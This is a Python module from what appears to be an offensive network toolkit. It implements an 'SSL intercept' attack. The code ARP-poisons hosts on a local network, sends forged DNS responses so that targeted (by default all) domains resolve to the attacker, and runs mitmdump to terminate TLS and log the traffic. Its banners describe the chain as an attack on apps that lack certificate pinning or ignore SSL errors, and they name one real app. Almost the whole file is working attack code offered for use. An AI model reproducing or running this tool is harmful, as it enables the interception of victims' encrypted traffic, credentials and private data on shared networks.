"""
SSLInterceptor — ARP spoof + DNS spoof + mitmproxy reverse proxy for HTTPS interception.

Attack chain:
1. ARP spoof targets (become their gateway)
2. Intercept DNS queries and spoof responses -> point target domains to our IP
3. mitmproxy runs in reverse proxy mode, terminates TLS with self-signed cert
4. Forward to real upstream, log everything

Works against apps with: no cert pinning, sslErrorHandler.proceed(),
cleartextTrafficPermitted=true (e.g., SSI iBoard).

macOS note: pf rdr doesn't work for forwarded packets, so we use
DNS spoofing to redirect traffic to our mitmproxy instead.
"""

import os
import sys
import json
import time
import signal
import subprocess
import threading
from typing import Optional, Dict, List

import click
from scapy.all import (
    IP, UDP, DNS, DNSRR, Ether,
    sendp, sniff, get_if_hwaddr, get_if_addr, getmacbyip,
)

from .base import BaseMITM


class SSLInterceptor(BaseMITM):
    """SSL intercept mode: ARP spoof + DNS spoof + mitmproxy reverse proxy."""

    def __init__(self, interface: str = "en0", log_dir: str = "./reports/mitm",
                 proxy_port: int = 443, domains: Optional[List[str]] = None,
                 stealth: bool = False):
        super().__init__(interface, log_dir, stealth)
        self.proxy_port = proxy_port
        self._dns_spoof_thread: Optional[threading.Thread] = None
        self._mitm_proc = None

        # Domains to intercept — DNS queries matching these will be spoofed
        # If empty, spoof ALL DNS queries (full intercept)
        self.spoof_domains = domains or []
        # Map of spoofed domain -> real IP (for upstream forwarding)
        self._real_dns: Dict[str, str] = {}
        self._dns_map_file = os.path.join(log_dir, "dns_map.json")

    # ── MAC Resolution ────────────────────────────────────

    def _get_cached_mac(self, ip: str) -> Optional[str]:
        """Get MAC from OS ARP cache (fallback when device doesn't reply to ARP)."""
        result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            # macOS: ? (10.1.0.13) at de:3f:2b:cd:83:85 on en0
            if ip in line and "at" in line and "incomplete" not in line:
                parts = line.split()
                at_idx = parts.index("at") if "at" in parts else -1
                if at_idx >= 0 and at_idx + 1 < len(parts):
                    mac = parts[at_idx + 1]
                    if ":" in mac:
                        return mac
        return None

    # ── DNS Spoofing ──────────────────────────────────────

    def _should_spoof(self, domain: str) -> bool:
        """Check if domain should be DNS-spoofed."""
        if not self.spoof_domains:
            return True  # Spoof ALL domains
        domain_lower = domain.lower().rstrip(".")
        return any(pattern in domain_lower for pattern in self.spoof_domains)

    def _dns_spoof_handler(self, pkt):
        """Intercept DNS queries from targets and send spoofed responses."""
        if not (pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt.haslayer(IP)):
            return
        if pkt[DNS].qr != 0 or not pkt[DNS].qd:
            return

        src_ip = pkt[IP].src
        if src_ip not in self.targets:
            return

        qname = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
        qtype = pkt[DNS].qd.qtype
        if qtype not in (1, 28):  # Only A and AAAA
            return

        if not self._should_spoof(qname):
            return

        # Resolve the real IP first (for our mitmproxy upstream)
        if qname not in self._real_dns:
            import socket
            try:
                real_ip = socket.gethostbyname(qname)
                self._real_dns[qname] = real_ip
                with open(self._dns_map_file, "w") as f:
                    json.dump(self._real_dns, f)
            except socket.gaierror:
                return

        # Build spoofed DNS response -> point to OUR IP
        spoofed = (
            IP(src=pkt[IP].dst, dst=src_ip)
            / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            / DNS(
                id=pkt[DNS].id,
                qr=1, aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    type="A", ttl=60,
                    rdata=self.our_ip,
                ),
            )
        )

        sendp(Ether(dst=self.targets[src_ip]) / spoofed,
              iface=self.interface, verbose=0)

        click.echo(click.style(
            f"  [DNS SPOOF] {src_ip} \u2192 {qname} \u2192 {self.our_ip} (real: {self._real_dns[qname]})",
            fg="magenta", bold=True,
        ))

    def _dns_spoof_loop(self):
        """Sniff DNS queries and spoof responses."""
        target_filter = " or ".join(f"src host {ip}" for ip in self.targets)
        bpf = f"udp port 53 and ({target_filter})"
        try:
            sniff(
                iface=self.interface,
                filter=bpf,
                prn=self._dns_spoof_handler,
                store=0,
                stop_filter=lambda _: not self.running,
            )
        except Exception:
            pass

    # ── mitmproxy Management ──────────────────────────────

    def _start_mitmproxy(self):
        """Start mitmdump in reverse proxy mode with dynamic upstream rewriting.

        DNS spoof sends traffic to our IP. mitmproxy listens on port 443,
        terminates TLS, and the addon rewrites upstream per-request based on
        the Host header -> DNS map (domain -> real IP).
        connection_strategy=lazy ensures server conn is deferred until addon runs.
        """
        addon_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "mitm_addon.py")

        # Kill any orphaned process on the proxy port
        check = subprocess.run(["lsof", "-ti", f":{self.proxy_port}"],
                               capture_output=True, text=True)
        if check.stdout.strip():
            for pid in check.stdout.strip().split("\n"):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                except (ProcessLookupError, ValueError):
                    pass
            time.sleep(1)
            click.echo(f"  Killed orphaned process on port {self.proxy_port}")

        # Initialize empty DNS map file
        with open(self._dns_map_file, "w") as f:
            json.dump({}, f)

        mitm_cmd = [
            "mitmdump",
            "--mode", "reverse:https://127.0.0.1/",
            "--listen-port", str(self.proxy_port),
            "--ssl-insecure",
            "--set", f"logdir={self.log_dir}",
            "--set", f"dns_map={self._dns_map_file}",
            "--set", "connection_strategy=lazy",
            "--set", "keep_host_header=true",
            "-s", addon_path,
            "--showhost",
        ]

        if self.proxy_port < 1024 and os.geteuid() != 0:
            cmd = ["sudo"] + mitm_cmd
        else:
            cmd = mitm_cmd

        click.echo(f"  Starting mitmdump on port {self.proxy_port} ...")
        click.echo(f"    {' '.join(cmd)}")

        self._mitm_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

        # Wait for mitmdump to start
        time.sleep(3)
        if self._mitm_proc.poll() is not None:
            output = self._mitm_proc.stdout.read().decode(errors="ignore")
            click.echo(click.style(f"  ERROR: mitmdump failed:\n{output}", fg="red"))
            return False

        # Verify port is listening
        for _ in range(5):
            check = subprocess.run(["lsof", "-i", f":{self.proxy_port}", "-P", "-n"],
                                   capture_output=True, text=True)
            if "LISTEN" in check.stdout:
                break
            time.sleep(1)
        else:
            click.echo(click.style(
                f"  WARNING: mitmdump may not be listening on port {self.proxy_port}", fg="yellow"))

        click.echo(click.style(f"  mitmdump proxy active (port {self.proxy_port})", fg="green", bold=True))
        return True

    def _stop_mitmproxy(self):
        if self._mitm_proc and self._mitm_proc.poll() is None:
            self._mitm_proc.terminate()
            try:
                self._mitm_proc.wait(timeout=5)
            except Exception:
                self._mitm_proc.kill()
            click.echo("  mitmdump stopped")

    # ── Main Entry ────────────────────────────────────────

    def start(
        self,
        target: Optional[str] = None,
        gateway: Optional[str] = None,
        gateway_mac: Optional[str] = None,
        network: Optional[str] = None,
    ):
        """Start SSL intercept mode."""
        self.our_ip = get_if_addr(self.interface)
        self.our_mac = get_if_hwaddr(self.interface)

        click.echo(click.style("\n  \u250c\u2500 MITM SSL Interceptor \u2500\u2510", fg="red", bold=True))
        click.echo(f"  \u2502 Interface:  {self.interface}")
        click.echo(f"  \u2502 Our IP:     {self.our_ip} ({self.our_mac})")
        click.echo(f"  \u2502 Proxy port: {self.proxy_port}")
        click.echo("  \u2502 CA cert:    ~/.mitmproxy/mitmproxy-ca-cert.pem")

        if not gateway:
            gateway = self._detect_gateway()
        self.gateway_ip = gateway

        # Try to get gateway MAC: manual > ARP cache > scapy getmacbyip
        if gateway_mac:
            self.gateway_mac = gateway_mac
        else:
            self.gateway_mac = self._get_mac_from_arp_cache(gateway)
            if not self.gateway_mac:
                self.gateway_mac = getmacbyip(gateway)
        if not self.gateway_mac:
            click.echo(click.style(f"  \u2502 ERROR: Cannot resolve gateway {gateway}", fg="red"))
            click.echo(click.style("  \u2502        Try: arp -a  # to see available gateways", fg="yellow"))
            click.echo(click.style(f"  \u2502        Then: hot net mitm -S -g {gateway} --gateway-mac <MAC>", fg="yellow"))
            return
        click.echo(f"  \u2502 Gateway:    {self.gateway_ip} ({self.gateway_mac})")

        if target:
            mac = getmacbyip(target)
            if not mac:
                mac = self._get_cached_mac(target)
                if mac:
                    click.echo(f"  \u2502 (used cached ARP for {target})")
            if mac:
                self.targets = {target: mac}
            else:
                click.echo(click.style(f"  \u2502 ERROR: Cannot resolve target {target}", fg="red"))
                return
        else:
            self.targets = self._discover_targets(network)

        click.echo(f"  \u2502 Targets:    {len(self.targets)} hosts")
        for ip, mac in self.targets.items():
            click.echo(f"  \u2502   {ip} ({mac})")

        if self.spoof_domains:
            click.echo(f"  \u2502 Domains:    {', '.join(self.spoof_domains)}")
        else:
            click.echo("  \u2502 Domains:    ALL (full DNS spoof)")

        click.echo(click.style("  \u2502", fg="red"))
        click.echo(click.style("  \u2502 Attack chain:", fg="red"))
        click.echo("  \u2502   1. ARP spoof (become gateway)")
        click.echo("  \u2502   2. DNS spoof (redirect domains \u2192 our IP)")
        click.echo("  \u2502   3. mitmproxy terminates TLS (self-signed cert)")
        click.echo("  \u2502   4. Forward to real upstream, log everything")
        click.echo(click.style("  \u2502", fg="red"))
        click.echo(click.style("  \u2502 Effective against:", fg="yellow"))
        click.echo("  \u2502   - Apps with no certificate pinning")
        click.echo("  \u2502   - Apps with sslErrorHandler.proceed()")
        click.echo("  \u2502   - Apps with cleartextTrafficPermitted=true")
        click.echo("  \u2502   - WebViews ignoring SSL errors")
        click.echo(click.style("  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n", fg="red", bold=True))

        if not self.targets:
            click.echo(click.style("  No targets found!", fg="red"))
            return

        click.echo("  [1/4] Enabling IP forwarding ...")
        self._enable_forwarding()

        click.echo("  [2/4] Starting mitmproxy ...")
        if not self._start_mitmproxy():
            return

        click.echo("  [3/4] Starting ARP poisoning ...")
        self.running = True
        self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._poison_thread.start()
        click.echo(click.style("  ARP poisoning active", fg="green", bold=True))

        click.echo("  [4/4] Starting DNS spoofing ...")
        self._dns_spoof_thread = threading.Thread(target=self._dns_spoof_loop, daemon=True)
        self._dns_spoof_thread.start()
        click.echo(click.style("  DNS spoofing active", fg="green", bold=True))

        click.echo(click.style(
            "\n  SSL Intercept ACTIVE \u2014 intercepting HTTPS via DNS spoof (Ctrl+C to stop)\n",
            fg="red", bold=True,
        ))

        def _signal_handler(sig, frame):
            click.echo(click.style("\n  Shutting down ...", fg="yellow"))
            self.stop()
            sys.exit(0)

        signal.signal(signal.SIGINT, _signal_handler)
        signal.signal(signal.SIGTERM, _signal_handler)

        # Stream mitmdump output
        try:
            while self._mitm_proc and self._mitm_proc.poll() is None:
                line = self._mitm_proc.stdout.readline()
                if line:
                    text = line.decode(errors="ignore").strip()
                    if text:
                        click.echo(f"  {text}")
        except (KeyboardInterrupt, SystemExit):
            pass
        finally:
            if self.running:
                self.stop()

    def stop(self):
        """Stop everything and clean up."""
        self.running = False
        if self._poison_thread:
            self._poison_thread.join(timeout=3)
        if self._dns_spoof_thread:
            self._dns_spoof_thread.join(timeout=3)

        self._stop_mitmproxy()
        self._restore_arp()
        self._disable_forwarding()

        import glob as glob_mod
        logs = sorted(glob_mod.glob(os.path.join(self.log_dir, "ssl_intercept_*.jsonl")))
        latest_log = logs[-1] if logs else "N/A"

        click.echo(click.style("\n  \u250c\u2500 SSL Intercept Summary \u2500\u2510", fg="cyan", bold=True))
        click.echo(f"  \u2502 Log: {latest_log}")
        if self._real_dns:
            click.echo(f"  \u2502 Spoofed domains: {len(self._real_dns)}")
            for domain, real_ip in list(self._real_dns.items())[:10]:
                click.echo(f"  \u2502   {domain} (real: {real_ip})")
        click.echo(click.style("  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n", fg="cyan", bold=True))
